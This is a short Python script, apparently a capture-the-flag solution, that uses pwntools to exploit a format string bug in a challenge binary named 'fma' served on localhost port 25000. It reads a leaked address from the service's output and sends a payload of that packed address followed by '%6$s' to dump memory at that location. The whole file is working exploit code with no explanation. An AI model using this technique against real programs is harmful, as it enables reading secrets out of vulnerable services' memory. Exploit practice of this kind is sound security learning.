from pwn import *

context.log_level='debug'

# p = process('./fma')
p = remote("localhost", 25000)

flag = int(p.recvline().split(b" ")[-1][:-1], 16)
p.recvline()
payload = b""
payload += p32(flag)
payload += b"%6$s"
p.sendline(payload)
print(p.recv())
p.close()

